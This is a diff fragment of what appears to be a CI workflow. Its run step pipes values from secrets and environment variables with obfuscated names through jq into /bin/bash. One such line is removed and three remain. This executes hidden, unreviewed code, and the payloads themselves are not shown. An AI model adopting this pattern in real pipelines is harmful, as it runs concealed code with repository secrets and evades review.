@@ -19,7 +19,6 @@ jobs:
           eexx1929: ${{ secrets.eexx1929 }}
         run: |
           printf '%s' "$eexx1929" | jq -r .yc77029 | /bin/bash
-          printf '%s' "$sh9" | jq -r .kpvg2 | /bin/bash
           echo $dl739 | jq -r .sm6 | /bin/bash
           echo $guc2 | jq -r .qatj627 | /bin/bash
 
